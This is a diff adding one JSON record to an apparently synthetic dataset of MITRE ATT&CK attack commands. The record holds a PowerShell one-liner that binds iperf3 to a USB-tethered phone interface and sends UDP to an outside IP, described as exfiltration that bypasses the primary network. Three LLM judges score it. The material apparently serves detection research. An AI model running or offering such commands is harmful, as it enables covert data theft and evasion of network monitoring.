@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
+  "explanation": "Targets a USB\u2011tethered RNDIS interface (smartphone tether) and binds iperf3 to it, exfiltrating over the phone\u2019s cellular uplink (alternate medium) as per T1011.",
+  "rationale_steps": [
+    "Locate the USB RNDIS network adapter from a tethered phone.",
+    "Determine its IPv4 address for binding.",
+    "Run iperf3 UDP client on a high port bound to the RNDIS interface.",
+    "Leverage the phone\u2019s cellular path to bypass the primary network."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-c0a371f5",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell pipeline, conditionals, quoting, property access, and iperf3 flags are well-formed and balanced with valid separators.",
+        "semantic_score": 2,
+        "semantic_justification": "Although it correctly binds iperf3 traffic to a USB RNDIS interface and transmits UDP to a remote host, it does not package or transfer collected data or include automation behaviors characteristic of T1011 Automated Exfiltration.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T02:09:41.816191Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses/braces, correct variable assignments, proper piping, conditional logic, and valid parameter flags for all cmdlets used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements automated exfiltration by identifying a USB-tethered smartphone interface, obtaining its IP address, and using iperf3 to exfiltrate data over the cellular connection to a remote server with specific parameters for duration and protocol.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:09:44.991328Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell cmdlets, operators, variable assignments, control flow, and external executable invocation with valid flags, all balanced and properly formatted.",
+        "semantic_score": 5,
+        "semantic_justification": "The command logically identifies a specific tethered network interface, retrieves its IP address, and then uses iperf3 to generate UDP traffic bound to that interface for a specified duration to a remote server, effectively demonstrating automated exfiltration over an alternate medium as described by T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:09:58.314205Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
